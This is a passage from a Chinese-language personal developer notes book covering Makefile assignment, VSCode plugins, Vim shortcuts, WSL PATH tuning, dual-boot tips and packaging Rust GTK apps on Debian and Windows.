<p><code>$(MAKE) -C subdir</code> 等价于 <code>cd subdir &amp;&amp; $(MAKE)</code></p>
<h2 id="赋值"><a class="header" href="#赋值">赋值</a></h2>
<p>Makefile中一共有4种赋值符号。</p>
<ul>
<li><code>=</code>：make会将整个makefile展开后，再决定变量的值。也就是说，变量的值将会是整个makefile中最后被指定的值。看例子，在下例中，y的值将会是 xyz bar ，而不是 foo bar 。：</li>
</ul>
<pre><code>x = foo
y = $(x) bar
x = xyz
</code></pre>
<ul>
<li><code>:=</code>：表示变量的值决定于它在makefile中的位置，而不是整个makefile展开后的最终值。如果吧上面的<code>=</code>换成<code>:=</code>，那么y的值将会是foo bar。</li>
<li><code>?= </code>：是如果没有被赋值过就赋予等号后面的值</li>
<li><code>+= </code>：是添加等号后面的值</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="vscode"><a class="header" href="#vscode">VSCode</a></h1>
<p>VSCode是一个强大的编辑器，通过插件的配置可以让你享受IDE的体验。</p>
<h2 id="开发插件推荐"><a class="header" href="#开发插件推荐">开发插件推荐</a></h2>
<p>VSCode的很多强大功能都是由插件支持的。</p>
<h3 id="通用插件"><a class="header" href="#通用插件">通用插件</a></h3>
<div class="table-wrapper"><table><thead><tr><th>插件名</th><th>说明</th><th>使用方法</th></tr></thead><tbody>
<tr><td>Error Lens :star2:</td><td>让错误提示更好看</td><td></td></tr>
<tr><td>TODO Tree</td><td>TODO高亮和展示</td><td>注释加上 todo xxx</td></tr>
<tr><td>Remote SSH/Container/WSL</td><td>连接SSH/Docker/WSL</td><td></td></tr>
<tr><td>Gitlens(GitLess)</td><td>更强的Git管理</td><td></td></tr>
<tr><td>Hex Editor</td><td>查看和编辑二进制文件</td><td>-</td></tr>
<tr><td>Material Icon Theme + One Dark Pro</td><td>好看的主题</td><td></td></tr>
<tr><td>Test Explorer</td><td>测试</td><td></td></tr>
<tr><td>LeetCode</td><td>LeetCode本地刷题</td><td>可以配置代码保存目录</td></tr>
<tr><td>SQL Tools</td><td>连接数据库</td><td></td></tr>
<tr><td>Code Spell Checker</td><td>拼写检查</td><td></td></tr>
</tbody></table>
</div>
<h3 id="rust开发"><a class="header" href="#rust开发">Rust开发</a></h3>
<div class="table-wrapper"><table><thead><tr><th>插件名</th><th>说明</th><th>配置/使用方法</th></tr></thead><tbody>
<tr><td>rust-analysis</td><td>更好的Rust language server，提供自动类型推导、代码补全等</td><td></td></tr>
<tr><td>Even Better TOML</td><td>TOML文件高亮和提示</td><td></td></tr>
<tr><td>crates</td><td>包版本检查</td><td></td></tr>
<tr><td>Codelldb</td><td>Rust debug</td><td></td></tr>
</tbody></table>
</div>
<p>虽然安装了Rust插件，不过还是十分依赖于Cargo命令的。</p>
<blockquote>
<p>有时候代码的Build Script中会依赖一些环境变量的配置，可以在.vscode/seetings.json中配置环境变量</p>
</blockquote>
<h3 id="cc开发"><a class="header" href="#cc开发">C/C++开发</a></h3>
<div class="table-wrapper"><table><thead><tr><th>插件名</th><th>说明</th><th>使用方法</th></tr></thead><tbody>
<tr><td>clangd</td><td>更好的C/C++ language server</td><td></td></tr>
<tr><td>Native Debug</td><td>调试C/C++程序</td><td></td></tr>
<tr><td>Doxygen Documentation Generator</td><td>C/C++注释生成</td><td>输入<code>/**</code>然后回车</td></tr>
</tbody></table>
</div>
<blockquote>
<p>clangd可以用<code>.clang-format</code>文件配置格式化方法。</p>
<p>有时候clangd插件无法判断你的头文件的地址，这时候可以在.vscode/settings.json中配置头文件搜索路径</p>
<pre><code class="language-json">{
    &quot;clangd.fallbackFlags&quot;: [
        &quot;-I${workspaceFolder}/include&quot;,
        &quot;-I${workspaceFolder}/arch/riscv/include&quot;
    ]
}
</code></pre>
</blockquote>
<h3 id="python开发"><a class="header" href="#python开发">Python开发</a></h3>
<div class="table-wrapper"><table><thead><tr><th>插件名</th><th>说明</th><th>使用方法</th></tr></thead><tbody>
<tr><td>Python</td><td>装就完事了</td><td>-</td></tr>
<tr><td>Pylance</td><td>帮你检查代码，支持type hint</td><td>-</td></tr>
<tr><td>Python Docstring Generator</td><td>自动生成规范的注释格式</td><td>输入<code>&quot;&quot;&quot;</code>然后回车</td></tr>
</tbody></table>
</div>
<h3 id="其他语言开发"><a class="header" href="#其他语言开发">其他语言开发</a></h3>
<div class="table-wrapper"><table><thead><tr><th>插件名</th><th>说明</th><th>使用方法</th></tr></thead><tbody>
<tr><td>TeX Workshop</td><td>latex支持</td><td></td></tr>
<tr><td>Verilog-HDL/Systemverilog</td><td>Verilog支持</td><td></td></tr>
<tr><td>RISC-V Support</td><td>RISC-V汇编支持</td><td></td></tr>
<tr><td>markdownlint</td><td>Markdown检查</td><td></td></tr>
</tbody></table>
</div>
<h2 id="debug"><a class="header" href="#debug">Debug</a></h2>
<p>Debug的配置由<code>.vscode/launch.json</code>（准确的说，这个JSON是被VSCode扩展的JSON，他支持了注释）文件管理。当你打开调试面板的时候，可以选择<code>launch.json</code>里面不同的<code>configuration</code>进行调试。</p>
<p>一般来说，你点击<code>调试</code>的时候你的插件会自动帮你生成一个，但是不一定符合你的意思，你可以修改他。</p>
<p>根据上面的配置，Python的调试好像就是用解释器一行一行执行，rust会使用lldb进行调试，C/C++会使用gdb进行调试。这个<a href="https://lldb.llvm.org/use/map.html">gdb/lldb的命令map表</a>很有用。现在的VSCode可以直接在Debug Console输入Python语句、gdb/lldb的命令了，好用。</p>
<h2 id="常用快捷键"><a class="header" href="#常用快捷键">常用快捷键</a></h2>
<p><code>Ctrl+P</code>可以调出命令窗口。然后命令的不同前缀有不同的含义。前面两个比较重要。</p>
<div class="table-wrapper"><table><thead><tr><th>前缀</th><th>含义</th></tr></thead><tbody>
<tr><td>?</td><td>显示可执行的命令</td></tr>
<tr><td>&gt;</td><td>输入命令</td></tr>
<tr><td>@</td><td>查找当前工程下的符号</td></tr>
<tr><td>#</td><td>查找当前文件下的符号</td></tr>
<tr><td>:</td><td>跳转到输入的行号</td></tr>
<tr><td>无</td><td>跳转到输入的文件名</td></tr>
</tbody></table>
</div>
<p><code>Ctrl + Alt + '-'</code>: 跳转返回。</p>
<p><code>Ctrl + Space</code>: 代码提示。</p>
<h2 id="小技巧"><a class="header" href="#小技巧">小技巧</a></h2>
<ul>
<li>终于可以在文件列表中用<code>Ctrl+F</code>搜索文件了。</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="vim"><a class="header" href="#vim">Vim</a></h1>
<p>因为Vim的使用技巧实在是太多了。。所以碰到一个问题百度一次记录一次。</p>
<h2 id="模式转换"><a class="header" href="#模式转换">模式转换</a></h2>
<p>VIM有三个模式，编辑模式，普通模式，命令模式。</p>
<div class="table-wrapper"><table><thead><tr><th>按键</th><th>编辑模式</th></tr></thead><tbody>
<tr><td>i</td><td>在当前选中字符前进入编辑模式</td></tr>
<tr><td>a</td><td>在当前选中字符后进入编辑模式</td></tr>
<tr><td><code>esc</code></td><td>进入普通模式</td></tr>
<tr><td>:</td><td>进入命令模式</td></tr>
</tbody></table>
</div>
<h2 id="普通模式"><a class="header" href="#普通模式">普通模式</a></h2>
<h3 id="光标移动"><a class="header" href="#光标移动">光标移动</a></h3>
<p>在普通模式下的光标移动方式</p>
<div class="table-wrapper"><table><thead><tr><th>按键</th><th>移动</th></tr></thead><tbody>
<tr><td>hjkl</td><td>左下右上</td></tr>
<tr><td>A</td><td>行尾</td></tr>
<tr><td>w</td><td>下一个单词的词头</td></tr>
<tr><td>e</td><td>下一个单词的结尾</td></tr>
<tr><td>b</td><td>上一个单词的词头</td></tr>
<tr><td>gg</td><td>移动到首行</td></tr>
<tr><td>G</td><td>移动到末行</td></tr>
<tr><td><code>:num</code></td><td>移动到第num行</td></tr>
</tbody></table>
</div>
<p>可以配合数字来移动多个字符，比如 <code>5l</code> 向左移动 5 个字符，比如 <code>10j</code> 向下移动 10 行。</p>
<h2 id="命令模式"><a class="header" href="#命令模式">命令模式</a></h2>
<h3 id="保存"><a class="header" href="#保存">保存</a></h3>
<p><code>w</code>保存，<code>q</code>退出。</p>
<p><code>wq</code>保存并退出，<code>q!</code>不保存并退出。</p>
<h3 id="查找和替换"><a class="header" href="#查找和替换">查找和替换</a></h3>
<p>查找，<code>/</code>向后查找，<code>?</code>向前查找。<code>n</code> 跳转到下一个匹配。<code>N</code> 跳转到上一个匹配。</p>
<p>替换基本的模板是这样的 <code>:[range]s/from/to/[flags]</code></p>
<ul>
<li>
<p><code>range</code>:搜索范围，如果没有指定范围，则作用于但前行。</p>
<ol>
<li><code>:1,10s/from/to/</code> 表示在第1到第10行（包含第1，第10行）之间搜索替换；</li>
<li><code>:10s/from/to/</code> 表示只在第10行搜索替换；</li>
<li><code>:%s/from/to/</code> 表示在所有行中搜索替换；</li>
</ol>
</li>
<li>
<p><code>flags</code> 有如下四个选项：</p>
<ol>
<li><code>c</code> confirm，每次替换前询问；</li>
<li><code>e</code> error， 不显示错误；</li>
<li><code>g</code> globle，不询问，整行替换。如果不加<code>g</code>选项，则只替换每行的第一个匹配到的字符串；</li>
<li><code>i</code> ignore，忽略大小写。</li>
</ol>
</li>
<li>
<p><code>from</code>是用来匹配的字符串，<code>to</code>是用来替换的字符串</p>
<ul>
<li><code>from</code>是可以利用正则表达式进行替换的</li>
<li>在<code>from</code>中以<code>\(</code>和<code>\)</code>括起来的正则表达式，在<code>to</code>使用的时候可以用<code>\1</code>、<code>\2</code>等变量来访问<code>\(</code>和<code>\)</code>中的内容。</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="wsl"><a class="header" href="#wsl">WSL</a></h1>
<p>使用的是WSL2，安装方式按照<a href="https://docs.microsoft.com/zh-cn/windows/wsl/install-win10">微软官网的建议</a>，Ubuntu20.04。</p>
<p>推荐和VSCODE配合使用。</p>
<h2 id="自动补全卡顿"><a class="header" href="#自动补全卡顿">自动补全卡顿</a></h2>
<p>我发现环境变量被设置成了包括很多windows路径下的东西。好像把Windows的环境变量也设置进去了，所以在.bashrc中修改了环境变量。</p>
<pre><code class="language-bash">PATH=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/root/.vscode-server/bin/379476f0e13988d90fab105c5c19e7abc8b1dea8/bin:/root/.cargo/bin:/usr/local/sbin&quot;
</code></pre>
<p>这样自动补全的搜索路径就小了，果然不卡了。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="双系统使用经历"><a class="header" href="#双系统使用经历">双系统使用经历</a></h1>
<p>如果不是苹果电脑，不是设计师，我觉得一般的Windows本就挺好。硬盘有512G以上就可以了，建议对半分。</p>
<p>Windows用来运行一些只能在Windows工作的软件以及游戏，开发环境都按照在Linux上。下面是一些使用技巧</p>
<ul>
<li>共享家目录：Linux支持NTFS，所以可以把Linux家目录的文件夹比如<code>Documents</code>等，软链接到Windows家目录下。</li>
<li>大部分软件装在Linux下，只有Windows版的装在Windows。</li>
<li>Zotero可以共享工作目录。</li>
<li>Windows可以把快速关机取消了，这样切换双系统会方便一点。不过如果你很少切换倒也没关系。</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="软件打包"><a class="header" href="#软件打包">软件打包</a></h1>
<p>事实上我之前从未接触过软件开发和发布的流程，这次也算是补一补知识了。</p>
<h2 id="软件打包-1"><a class="header" href="#软件打包-1">软件打包</a></h2>
<p>如果所有的库和资源都是静态链接的话，那么就只需要发布一个二进制文件了。</p>
<h2 id="linux-debian"><a class="header" href="#linux-debian">Linux-Debian</a></h2>
<p>Linux上的gtk库的安装非常简单，用<code>apt install libgtk-4-dev</code>即可，不过老的版本可能没有gtk4的库，这个我不管了。</p>
<p><code>cargo-deb</code>可以帮助我们快速打包程序。<code>cargo install cargo-deb</code>。</p>
<h2 id="windows"><a class="header" href="#windows">Windows</a></h2>
<p>在windows上第一个难以解决的问题是gtk库的安装。<a href="https://doko-demo-doa.medium.com/rust-gtk-on-windows-getting-started-14aa2d7c825d">参考链接</a></p>
<p>首先让我们安装<a href="https://www.msys2.org/">msys2</a>。<strong>MSYS2</strong> is a collection of tools and libraries providing you with an easy-to-use environment for building, installing and running native Windows software。所以他到底是做什么用的呢？简单理解就是让我们可以在windows开发上用linux的库。The <code>msys2</code> subsystem provides an emulated mostly-POSIX-compliant environment for building software, package management, and shell scripting.</p>
<p>然后打开<code>msys2.exe</code>。这是一个shell，提供了Linux的环境。执行以下命令安装必要的软件和库</p>
<pre><code class="language-sh">pacman -S mingw-w64-x86_64-gtk4
pacman -S mingw-w64-x86_64-toolchain
</code></pre>
<p>然后我们要设置环境变量，把<code>C:\msys64\mingw64\bin</code>加入<code>PATH</code>，添加<code>GTK_LIB_DIR=C:\msys64\mingw64\lib</code>。这样我们就装好gtk4库了</p>
<p>另外，我们按照官网提示安装rust的默认工具链是<code>x86_64-pc-windows-msvc</code>，我们把它切换成<code>gnu</code>。执行以下命令</p>
<pre><code class="language-sh">rustup target add x86_64-pc-windows-gnu
rustup default stable-x86_64-pc-windows-gnu
</code></pre>
<p>至此，我们应该可以build/run一个gtk-rs的程序了。</p>
<hr />
<p><code>cargo-wix</code>可以帮助我们快速打包程序。<code>wix</code>是一个开源的软件打包工具，<code>cargo-wix</code>依赖于<code>wix</code>。和<code>cargo-deb</code>类似，他也会从cargo.toml中提取项目的元信息。其中<code>author</code>是必须的，最好还有LISENCE等，他会提示你。</p>
<p>安装cargo-wix: <code>cargo install cargo-wix</code></p>
<p>执行下面的命令，构建软件包。</p>
<pre><code class="language-sh">cargo wix init
cargo wix
</code></pre>
<p>这样直接打包，仍然没有把dll容纳进去。别人安装，仍然不能正常运行。</p>
<h3 id="wix"><a class="header" href="#wix">WIX</a></h3>
<p>https://subscription.packtpub.com/book/application-development/9781782160427/1/ch01lvl1sec09/your-first-wix-project</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>




        <script type="text/javascript">
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>

        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->

        <script type="text/javascript">
        window.addEventListener('load', function() {
            MathJax.Hub.Register.StartupHook('End', function() {
                window.setTimeout(window.print, 100);
            });
        });
        </script>

    </body>
</html>
